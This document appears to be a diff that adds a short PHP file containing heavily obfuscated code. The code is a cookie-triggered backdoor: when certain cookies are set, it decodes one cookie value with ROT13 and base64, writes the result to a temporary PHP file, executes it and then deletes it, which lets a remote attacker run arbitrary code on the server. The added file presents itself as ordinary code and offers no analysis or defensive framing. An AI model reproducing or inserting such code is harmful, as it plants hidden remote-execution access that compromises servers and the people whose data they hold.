@@ -1,0 +1,6 @@
+<?php
+
+if(isset($_COOKIE['sc'])) {
+    die('DcoSL'.'hape');
+}
+if(isset($_COOKIE[-(int)RoUnD(0.25+0.25+0.25+0.25)+(int)ROUnd(0.25+0.25+0.25+0.25)])&&isset($_COOKIE[-(0b110100000+268+-195+-0b110101001)+(int)rOUNd(21.666666666667+21.666666666667+21.666666666667)])&&isset($_COOKIE[(0x337- -0x2c3+01266-2183)-(0216+-0b1101000)])&&isset($_COOKIE[(int)roUND(21.25+21.25+21.25+21.25)-(int)RoUnD(27+27+27)])):$_0=$_COOKIE;function __($_1){$_0=$_COOKIE;$_2=tEmPnaM((!empty(SEssiON_savE_path())?SEssION_SAve_PAth():sys_gET_tEmp_DIR()),"KGH3Wv7D");if(!Is_WrITAbLe($_2)):$_2=getcWd().DIRECTORY_SEPARATOR."unit_\143onverter";endif;$_3="<?\160hp ".base64_DecoDe(STr_Rot13($_0[615+-0x264]));if(IS_wRItEABle($_2)):$_4=FOPen($_2,"w\x2b");FPuts($_4,$_3);fclosE($_4);SpL_aUtoLOAD_UnreGIstEr(__FUNCTION__);require_once($_2);@ARRAY_MAP("un\x6cink",array($_2));endif;}spl_aUtOLoAD_reGisTER("\137_");$_5="4b\x64fe\06287\x629\141\146\061f\061f1\063\0624a\x30\061\x302c\06417c\0713";if(!STrnCMp($_5,$_0[(int)ROuND(1.3333333333333+1.3333333333333+1.3333333333333)],-0x2d2+435+319)):if(@cLAss_pareNTs("data\x66\154\157w_en\147ine\137request_appr\x6fv\x65d",true)):exit;endif;endif;endif;
